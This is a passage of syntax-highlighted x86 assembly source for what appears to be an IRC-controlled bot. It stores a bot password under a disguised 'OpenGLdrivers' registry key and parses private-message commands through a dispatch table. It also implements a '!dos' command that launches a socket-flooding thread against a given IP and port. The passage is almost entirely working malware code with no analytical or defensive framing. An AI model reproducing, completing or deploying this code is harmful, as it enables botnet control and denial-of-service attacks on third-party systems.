</span><span class="sc5">setup_registry</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Software</span><span class="sc0">\</span><span class="sc5">Microsoft</span><span class="sc0">\</span><span class="sc5">Windows</span><span class="sc0">\</span><span class="sc5">CurrentVersion</span><span class="sc0">\</span><span class="sc5">OpenGLdrivers</span><span class="sc4">~</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">_xsize</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Default</span><span class="sc4">~</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_xsize</span><span class="sc0">
            </span><span class="sc5">@pushvar</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">@pushvar</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">REG_SZ</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">SHGetValueA</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__convert</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bot_password</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">save_hash</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__err</span><span class="sc0">

</span><span class="sc5">__convert</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">atoi</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bot_password</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; analyzes given commands and calls corresponding subroutines</span><span class="sc0">
</span><span class="sc1">; i: automatically set after call to read_line</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">parse_line</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; save ptr to the end of line</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_recv_buffer</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc5">irc.</span><span class="sc0">              </span><span class="sc1">; discard irc.* </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">

            </span><span class="sc5">x_pop</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">quit_oky</span><span class="sc0">
        
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"GNIP"</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">pong</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc5">@endspc</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"VIRP"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">quit_oky</span><span class="sc0">
    
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">" GSM"</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">quit_oky</span><span class="sc0">

            </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">; skip PRIVMSG + space</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endcr</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NORM_IGNORECASE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">LOCALE_SYSTEM_DEFAULT</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CompareStringA</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__private_msg</span><span class="sc0">

</span><span class="sc5">__chan_msg</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit_oky</span><span class="sc0">

</span><span class="sc5">__private_msg</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_recv_buffer</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@usklicnik</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; : &amp; !</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; nick length</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; needed 4 l8r</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">irc_cmd_nick</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">                       </span><span class="sc1">; +NULL</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; length of the active nick</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__s</span><span class="sc0">

</span><span class="sc5">priv_msg_curr_user</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PRIVMSG "</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">__s</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; construct default PRIVMSG for current user</span><span class="sc0">
            </span><span class="sc6">scasd</span><span class="sc0">                       </span><span class="sc1">; edi+=8</span><span class="sc0">
            </span><span class="sc6">scasd</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">": "</span><span class="sc0">                </span><span class="sc1">; after this comes the msg</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc5">@endspc</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">; esi+=8</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc5">@dvotocka</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; save ptr to the command</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; ebx is used for param. transfer</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_dispatch_table</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__unknown_cmd</span><span class="sc0">

            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bdelta</span><span class="sc0">          </span><span class="sc1">; prior to calling, relocate hard-coded subroutine offset</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">bad_quit</span><span class="sc0">

</span><span class="sc5">__unknown_cmd</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit_oky</span><span class="sc0">

</span><span class="sc5">pong</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'O'</span><span class="sc0">          
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send</span><span class="sc0">
            
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">bad_quit</span><span class="sc0">
    
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit_oky</span><span class="sc0">

</span><span class="sc5">bad_quit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">quit_oky</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">bot_cmd_stopdos</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">
            
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">DOS_flag</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            
            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; starts DOS attack on the target</span><span class="sc0">
</span><span class="sc1">; format: !dos &lt;IP&gt; &lt;port&gt; &lt;packet_size&gt; &lt;interval_in_ms_between_packets&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_dos</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">DOS_flag</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__okie</span><span class="sc0">
            
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DOS</span><span class="sc0"> </span><span class="sc5">attack</span><span class="sc0"> </span><span class="sc5">allready</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">progress.</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">32</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bot_cmd_dos_end</span><span class="sc0">

</span><span class="sc5">__okie</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__spc</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__skip</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__skip</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CR</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__spc</span><span class="sc0">
            
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">DOS_flag</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchspc</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">inet_addr</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">DOS_IP</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchspc</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2num</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">DOS_port</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchspc</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2num</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">DOS_packet_size</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchspc</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2num</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">DOS_interval</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; thread param</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bot_DOS_thread</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateThread</span><span class="sc0">
            
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
            
</span><span class="sc5">bot_cmd_dos_end</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">@retecx1</span><span class="sc0">
            
</span><span class="sc5">bot_DOS_thread</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">
            
            </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">__DOS_xception</span><span class="sc4">&gt;</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">dosdlta</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            
</span><span class="sc5">_DOS</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">dosdlta</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]&gt;</span><span class="sc0">
            
</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">AF_INET</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_socket</span><span class="sc0"> </span><span class="sc5">_DOS</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; sin_zero[8]</span><span class="sc0">
